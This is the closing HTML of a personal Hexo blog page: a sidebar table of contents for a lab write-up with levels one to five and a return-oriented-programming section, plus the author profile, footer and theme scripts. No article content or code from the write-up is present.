href="#Level1"><span class="nav-number">3.1.</span> <span class="nav-text">Level1:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level2%EF%BC%9A"><span class="nav-number">3.2.</span> <span class="nav-text">Level2：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level3%EF%BC%9A"><span class="nav-number">3.3.</span> <span class="nav-text">Level3：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E9%AA%8C%E9%83%A8%E5%88%862%E9%9D%A2%E5%90%91%E8%BF%94%E5%9B%9E%E7%9A%84%E7%BC%96%E7%A8%8B%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">实验部分2面向返回的编程：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Level4%EF%BC%9A"><span class="nav-number">4.1.</span> <span class="nav-text">Level4：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Level5%EF%BC%9A"><span class="nav-number">4.2.</span> <span class="nav-text">Level5：</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="fishjump"
      src="/uploads/dog.jpg">
  <p class="site-author-name" itemprop="name">fishjump</p>
  <div class="site-description" itemprop="description">一万年太久，只争朝夕</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">21</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/Fishjump-MY" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Fishjump-MY" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/1745482102@qq.com" title="E-Mail → 1745482102@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        <!---->

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fishjump</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">58k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">3:32</span>
</div>


<script async="" src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

  
   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
   <script type="text/javascript" src="/js/fireworks.js"></script>
  
  
</body>
</html>
